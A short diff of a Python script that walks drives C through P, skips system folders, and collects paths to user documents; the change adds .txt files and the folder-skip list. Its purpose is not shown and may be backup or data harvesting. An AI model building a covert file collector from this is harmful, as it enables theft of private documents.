@@ -25,16 +25,19 @@ copied = list()
 
 drives = ["C:\\", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:"]
 
+dir_blacklist = ["Windows", "Temp", "ProgramData", "Recovery", "AppData", "Boot", "Local Settings", "Application Data"]
+
 for drive in drives:
     for root, dirs, files in os.walk(drive):
+        dirs[:] = [d for d in dirs if d not in dir_blacklist]
         if len(root) == 0:
             pass
         else:
             for i in files:
-                if i.endswith(".pdf") or i.endswith(".xlsx") or i.endswith(".doc") or i.endswith(".docx"):
+                if i.endswith(".pdf") or i.endswith(".xlsx") or i.endswith(".doc") or i.endswith(".docx") or i.endswith(".txt"):
                     absp = os.path.join(root, i)
                     all_files.append(absp.replace(":", ":\\"))
-
+                    
 # print([i for i in all_files])
 
 cwd = os.getcwd()
